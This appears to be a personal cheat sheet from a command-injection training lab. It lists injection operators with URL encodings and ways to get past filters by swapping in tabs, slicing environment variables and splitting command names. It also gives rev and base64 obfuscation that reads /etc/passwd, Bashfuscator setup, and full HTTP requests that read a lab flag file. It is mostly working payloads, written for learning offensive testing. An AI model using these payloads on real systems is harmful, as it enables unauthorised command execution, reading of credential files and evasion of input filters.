- `;ls`
- `$(ls)`
- `` `ls` ``
- `&ls`
- `&&ls`
- ` |ls`


| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |
| Space                  | %09                     | %09                       | Use tab character instead of space         |

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |
- 127.0.0.1%0als (worked)

### Space Filter 

- `127.0.0.1%0als%09-la`  (Spaces)
	- `127.0.0.1` → valid input for the ping
	- `%0a` → newline operator to start a new command
	- `ls%09-la` → `ls -la` using a **tab** instead of space

### Bypassing Other Blacklisted Characters
- `echo ${PATH}` gives us the output  `/usr/local/bin:/usr/bin:/bin:/usr/games`
So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:
- `echo ${PATH:0:1}` gives us the output  `/`
similarly 
- `$env:HOMEPATH[0]`
- `echo ${LS_COLORS:10:1}`
- `echo ${PATH:0:1}`
- `${IFS}${PATH:0:1}`(worked)
- `${PATH:0:1}` (worked)

# Bypassing Blacklisted Commands


- `w'h'o'am'i` (Linux & Windows)
- `w"h"o"am"i` (Linux & Windows)
- `who$@ami (Linux Only)
- `w\ho\am\i`  (Linux Only)
- `who^ami`  (Windows Only)

example worked 
`ip=127.0.0.1%0ac'a't%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt`

# Advanced Command Obfuscation

- `WhOaMi`
- `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
- `$(a="WhOaMi";printf %s "${a,,}")`
- `echo 'whoami' | rev`
- `$(rev<<<'imaohw')`
- `"whoami"[-1..-20] -join ''
- `iex "$('imaohw'[-1..-20] -join '')"`
- `echo -n 'cat /etc/passwd | grep 33' | base64`
-  `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
- `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
- `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
- `base64%09$-d%09$<<<%09$'fA=` is equals to `|` in base-64 obfuscation 


Worked for the command  `find /usr/share/ | grep root | grep mysql | tail -n 1`

````
ip=127.0.0.1%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
````


# Evasion Tools

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
./bashfuscator -c 'cat /etc/passwd'
```


## # Skills Assessment

`%26$()'l's` worked as of full request is below

```
GET /index.php?to=tmp%26$()'l's&from=2561732172.txt&finish=1&move=1 HTTP/1.1
```

#### Flag
```
GET /index.php?to=tmp%26$()c'a't${IFS}${PATH:0:1}flag.txt&from=2561732172.txt&finish=1&move=1 HTTP/1.1
```